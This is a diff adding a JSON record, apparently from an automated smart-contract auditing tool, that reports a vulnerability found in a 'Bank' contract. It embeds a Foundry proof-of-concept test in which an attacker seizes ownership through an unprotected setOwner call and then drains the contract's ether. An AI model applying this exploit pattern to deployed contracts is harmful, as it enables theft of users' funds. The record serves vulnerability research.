@@ -1,0 +1,8 @@
+{
+  "contract": "Bank",
+  "found": true,
+  "poc": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/uploads/Bank.sol\";\n\ncontract BankExploitTest is Test {\n    Bank public bank;\n    address deployer = address(0x1);\n    address attacker = address(0x2);\n\n    function setUp() public {\n        vm.deal(deployer, 10 ether);\n        vm.startPrank(deployer);\n        bank = new Bank{value: 5 ether}();\n        vm.stopPrank();\n    }\n\n    function test_UnauthorizedDrain() public {\n        // Pre-exploit checks\n        assertEq(bank.owner(), deployer, \"Original owner should be deployer\");\n        assertEq(address(bank).balance, 5 ether, \"Initial balance incorrect\");\n\n        // Attack sequence\n        vm.startPrank(attacker);\n        bank.setOwner(attacker);  // Unauthorized ownership change\n        bank.drain();              // Drain funds\n        vm.stopPrank();\n\n        // Post-exploit assertions\n        assertEq(bank.owner(), attacker, \"Ownership takeover failed\");\n        assertEq(address(bank).balance, 0, \"Funds not drained\");\n        assertEq(attacker.balance, 5 ether, \"Attacker didn't receive funds\");\n    }\n}",
+  "iterations": 1,
+  "backend": "hf",
+  "ts": 1789845803.1011102
+}
